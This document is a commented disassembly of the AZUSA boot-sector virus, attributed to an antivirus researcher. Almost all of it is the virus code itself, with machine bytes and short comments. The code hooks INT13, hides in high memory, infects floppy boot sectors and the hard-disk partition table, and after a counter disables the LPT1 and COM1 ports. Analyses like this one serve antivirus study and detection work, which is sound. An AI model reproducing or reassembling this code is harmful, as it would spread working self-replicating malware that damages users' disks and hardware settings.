
; 	AZUSA virus
;
;	Discovered an commented by  Ferenc Leitold
; 			      Hungarian VirusBuster Team
;                              Address: 1399 Budapest
;                                       P.O. box 701/349
;                                          HUNGARY



217D:0100  E98B00         JMP    018E		; Jump to main entry point
217D:0103  50             PUSH   AX
217D:0104  43             INC    BX
217D:0105  20546F         AND    [SI+6F],DL
217D:0108  6F             OUTSW
217D:0109  6C             INSB
217D:010A  73

						; INT13 entry point
217D:010B  F6C402         TEST	 AH,02
217D:010E  745B           JZ     016B
217D:0110  F6C280         TEST   DL,80
217D:0113  7556           JNZ    016B 		; Jump, if hard disk
217D:0115  50             PUSH   AX
217D:0116  1E             PUSH   DS
217D:0117  31C0           XOR    AX,AX
217D:0119  8ED8           MOV    DS,AX
217D:011B  88D0           MOV    AL,DL
217D:011D  FEC0           INC    AL
217D:011F  84063F04       TEST   [043F],AL	; test diskette is work
217D:0123  7544           JNZ    0169

217D:0125  53             PUSH   BX		; Save registers
217D:0126  51             PUSH   CX
217D:0127  52             PUSH   DX
217D:0128  06             PUSH   ES
217D:0129  57             PUSH   DI
217D:012A  56             PUSH   SI

217D:012B  B80102         MOV    AX,0201	; Load boot sector of disk
217D:012E  0E             PUSH   CS
217D:012F  07             POP    ES
217D:0130  BB0002         MOV    BX,0200
217D:0133  B90100         MOV    CX,0001
217D:0136  B600           MOV    DH,00
217D:0138  E83500         CALL   0170
217D:013B  7226           JC     0163		; jump, if error

217D:013D  0E             PUSH   CS
217D:013E  1F             POP    DS
217D:013F  A18902         MOV    AX,[0289]	; Check if infected yet ?
217D:0142  3B068900       CMP    AX,[0089]
217D:0146  741B           JZ     0163		; Jump, if infected

217D:0148  B80103         MOV    AX,0301	; Write orig. boot sector
217D:014B  B90827         MOV    CX,2708	; cyl.: 39   sect.: 8
217D:014E  B601           MOV    DH,01          ; head: 1
217D:0150  E81D00         CALL   0170           ;  Call INT13 (write)
217D:0153  720E           JC     0163
217D:0155  E81F00         CALL   0177		; Copy parameters
217D:0158  B80103         MOV    AX,0301	; Write virus body
217D:015B  31DB           XOR    BX,BX
217D:015D  41             INC    CX             ; CX will 1 (CALL 0177)
217D:015E  B600           MOV    DH,00          ; head: 0
217D:0160  E80D00         CALL   0170           ;  Call INT13 (write)

217D:0163  5E             POP    SI		; Restore registers
217D:0164  5F             POP    DI
217D:0165  07             POP    ES
217D:0166  5A             POP    DX
217D:0167  59             POP    CX
217D:0168  5B             POP    BX

217D:0169  1F             POP    DS
217D:016A  58             POP    AX

217D:016B  EAEBA100F0     JMP    F000:A1EB	; Jump to orig. INT13

217D:0170  9C             PUSHF			; Call orig. INT13
217D:0171  2EFF1E6C00     CALL   Far CS:[006C]
217D:0176  C3             RET

217D:0177  BE0302         MOV    SI,0203	; Copy diskette par. area
217D:017A  BF0300         MOV    DI,0003
217D:017D  B90800         MOV    CX,0008
217D:0180  FC             CLD
217D:0181  F3A4           REP    MOVSB

217D:0183  BE7003         MOV    SI,0370        ; Copy parttition info.
217D:0186  BF7001         MOV    DI,0170
217D:0189  B190           MOV    CL,90
217D:018B  F3A4           REP    MOVSB
217D:018D  C3             RET


;*************************** Main entry point *************************

217D:018E  31C0           XOR    AX,AX		; Set STACK and DS
217D:0190  8ED8           MOV    DS,AX
217D:0192  8ED0           MOV    SS,AX
217D:0194  BC007C         MOV    SP,7C00

217D:0197  A14C00         MOV    AX,[004C]	; Save INT13 vector
217D:019A  A36C7C         MOV    [7C6C],AX
217D:019D  A14E00         MOV    AX,[004E]
217D:01A0  A36E7C         MOV    [7C6E],AX

217D:01A3  A11304         MOV    AX,[0413]	; Decrease memory by 1KB
217D:01A6  48             DEC    AX
217D:01A7  A31304         MOV    [0413],AX

217D:01AA  B106           MOV    CL,06		; Calculate segment at TOP
217D:01AC  D3E0           SHL    AX,CL
217D:01AE  8EC0           MOV    ES,AX

217D:01B0  C7064C000B00   MOV    [004C],000B	; Set new INT13 vector
217D:01B6  A34E00         MOV    [004E],AX

217D:01B9  B90002         MOV    CX,0200	; Copy itself to TOP
217D:01BC  BE007C         MOV    SI,7C00
217D:01BF  31FF           XOR    DI,DI
217D:01C1  FC             CLD
217D:01C2  F3A4           REP    MOVSB

217D:01C4  50             PUSH   AX		; Jump to TOP
217D:01C5  B8CA00         MOV    AX,00CA
217D:01C8  50             PUSH   AX
217D:01C9  CB             RET    Far


 TOP:01CA  31C0           XOR    AX,AX		; Reset drive
 TOP:01CC  CD13           INT    13

 TOP:01CE  31C0           XOR    AX,AX
 TOP:01D0  8EC0           MOV    ES,AX
 TOP:01D2  B80102         MOV    AX,0201
 TOP:01D5  BB007C         MOV    BX,7C00
 TOP:01D8  0E             PUSH   CS
 TOP:01D9  1F             POP    DS
 TOP:01DA  E83F00         CALL   021C		; Set CX & DX as the info
						;  of boot partition
 TOP:01DD  F6C1FF         TEST   CL,FF		; Check if it is floppy
 TOP:01E0  7408           JZ     01EA		; Jump, if it is
 TOP:01E2  E85100         CALL   0236
 TOP:01E5  EA007C0000     JMP    0000:7C00	; Jump to boot


						; If floppy disk
 TOP:01EA  B90827         MOV    CX,2708	; load original boot
 TOP:01ED  BA0001         MOV    DX,0100
 TOP:01F0  CD13           INT    13
 TOP:01F2  72F1           JC     01E5		; jump, if error

 TOP:01F4  0E             PUSH   CS
 TOP:01F5  07             POP    ES

 TOP:01F6  B80102         MOV    AX,0201	; Load partition table of
 TOP:01F9  BB0002         MOV    BX,0200	; hard disk
 TOP:01FC  B90100         MOV    CX,0001
 TOP:01FF  BA8000         MOV    DX,0080
 TOP:0202  CD13           INT    13
 TOP:0204  72DF           JC     01E5

 TOP:0206  A18902         MOV    AX,[0289]	; Check, if infected yet ?
 TOP:0209  39068900       CMP    [0089],AX
 TOP:020D  74D6           JZ     01E5		; jump to boot, if it is

 TOP:020F  E865FF         CALL   0177		; Copy parameter area
 TOP:0212  B80103         MOV    AX,0301	; Save virus as part. table
 TOP:0215  31DB           XOR    BX,BX
 TOP:0217  41             INC    CX
 TOP:0218  CD13           INT    13
 TOP:021A  EBC9           JMP    01E5

 TOP:021C  BEBE01         MOV    SI,01BE	; Find boot partition
 TOP:021F  B90400         MOV    CX,0004	;  in partition table
 TOP:0222  803C80         CMP    [SI],80
 TOP:0225  7407           JZ     022E
 TOP:0227  83C610         ADD    SI,0010
 TOP:022A  E2F6           LOOP   0222
 TOP:022C  EB07           JMP    0235		; If not found set CL=FF
 TOP:022E  8B4C02         MOV    CX,[SI+02]	; If found, load it
 TOP:0231  8B14           MOV    DX,[SI]
 TOP:0233  CD13           INT    13
 TOP:0235  C3             RET

 TOP:0236  F6066F01E0     TEST   [016F],E0	; Test counter
 TOP:023B  7515           JNZ    0252
 TOP:023D  80066F0101     ADD    [016F],01	; increase counter
 TOP:0242  B80103         MOV    AX,0301	; save virus body
 TOP:0245  0E             PUSH   CS		;  with increased counter
 TOP:0246  07             POP    ES
 TOP:0247  31DB           XOR    BX,BX
 TOP:0249  B90100         MOV    CX,0001
 TOP:024C  B600           MOV    DH,00
 TOP:024E  CD13           INT    13
 TOP:0250  EB0E           JMP    0260

 TOP:0252  31C0           XOR    AX,AX
 TOP:0254  8ED8           MOV    DS,AX
 TOP:0256  C606080400     MOV    [0408],00	; Corrupt LPT1 port
 TOP:025B  C606000400     MOV    [0400],00	; Coruupt COM1 port
 TOP:0260  0E             PUSH   CS
 TOP:0261  1F             POP    DS
 TOP:0262  C6066F0100     MOV    [016F],00	; Reset counter (in memory)
 TOP:0267  C6065A0100     MOV    [015A],00	; Zero LPT1 port corrupt par.
 TOP:026C  C3             RET

 TOP:026D  0000           ADD    [BX+SI],AL

 TOP:026F  00		  db	0		; counter

 TOP:0270  000000
 TOP:0273  0000           ADD    [BX+SI],AL
 TOP:0275  0000           ADD    [BX+SI],AL
 TOP:0277  0000           ADD    [BX+SI],AL
 TOP:0279  0000           ADD    [BX+SI],AL
 TOP:027B  0000           ADD    [BX+SI],AL
 TOP:027D  0000           ADD    [BX+SI],AL
 TOP:027F  0000           ADD    [BX+SI],AL
 TOP:0281  0000           ADD    [BX+SI],AL
 TOP:0283  0000           ADD    [BX+SI],AL
 TOP:0285  0000           ADD    [BX+SI],AL
 TOP:0287  0000           ADD    [BX+SI],AL
 TOP:0289  0000           ADD    [BX+SI],AL
 TOP:028B  0000           ADD    [BX+SI],AL
 TOP:028D  0000           ADD    [BX+SI],AL
 TOP:028F  0000           ADD    [BX+SI],AL
 TOP:0291  0000           ADD    [BX+SI],AL
 TOP:0293  0000           ADD    [BX+SI],AL
 TOP:0295  0000           ADD    [BX+SI],AL
 TOP:0297  0000           ADD    [BX+SI],AL
 TOP:0299  0000           ADD    [BX+SI],AL
 TOP:029B  0000           ADD    [BX+SI],AL
 TOP:029D  0000           ADD    [BX+SI],AL
 TOP:029F  0000           ADD    [BX+SI],AL
 TOP:02A1  0000           ADD    [BX+SI],AL
 TOP:02A3  0000           ADD    [BX+SI],AL
 TOP:02A5  0000           ADD    [BX+SI],AL
 TOP:02A7  0000           ADD    [BX+SI],AL
 TOP:02A9  0000           ADD    [BX+SI],AL
 TOP:02AB  0000           ADD    [BX+SI],AL
 TOP:02AD  0000           ADD    [BX+SI],AL
 TOP:02AF  0000           ADD    [BX+SI],AL
 TOP:02B1  0000           ADD    [BX+SI],AL
 TOP:02B3  0000           ADD    [BX+SI],AL
 TOP:02B5  0000           ADD    [BX+SI],AL
 TOP:02B7  0000           ADD    [BX+SI],AL
 TOP:02B9  0000           ADD    [BX+SI],AL
 TOP:02BB  0000           ADD    [BX+SI],AL
 TOP:02BD  0000           ADD    [BX+SI],AL
 TOP:02BF  0000           ADD    [BX+SI],AL
 TOP:02C1  0000           ADD    [BX+SI],AL
 TOP:02C3  0000           ADD    [BX+SI],AL
 TOP:02C5  0000           ADD    [BX+SI],AL
 TOP:02C7  0000           ADD    [BX+SI],AL
 TOP:02C9  0000           ADD    [BX+SI],AL
 TOP:02CB  0000           ADD    [BX+SI],AL
 TOP:02CD  0000           ADD    [BX+SI],AL
 TOP:02CF  0000           ADD    [BX+SI],AL
 TOP:02D1  0000           ADD    [BX+SI],AL
 TOP:02D3  0000           ADD    [BX+SI],AL
 TOP:02D5  0000           ADD    [BX+SI],AL
 TOP:02D7  0000           ADD    [BX+SI],AL
 TOP:02D9  0000           ADD    [BX+SI],AL
 TOP:02DB  0000           ADD    [BX+SI],AL
 TOP:02DD  0000           ADD    [BX+SI],AL
 TOP:02DF  0000           ADD    [BX+SI],AL
 TOP:02E1  0000           ADD    [BX+SI],AL
 TOP:02E3  0000           ADD    [BX+SI],AL
 TOP:02E5  0000           ADD    [BX+SI],AL
 TOP:02E7  0000           ADD    [BX+SI],AL
 TOP:02E9  0000           ADD    [BX+SI],AL
 TOP:02EB  0000           ADD    [BX+SI],AL
 TOP:02ED  0000           ADD    [BX+SI],AL
 TOP:02EF  0000           ADD    [BX+SI],AL
 TOP:02F1  0000           ADD    [BX+SI],AL
 TOP:02F3  0000           ADD    [BX+SI],AL
 TOP:02F5  0000           ADD    [BX+SI],AL
 TOP:02F7  0000           ADD    [BX+SI],AL
 TOP:02F9  0000           ADD    [BX+SI],AL
 TOP:02FB  0000           ADD    [BX+SI],AL
 TOP:02FD  0055AA         ADD    [DI-56],DL
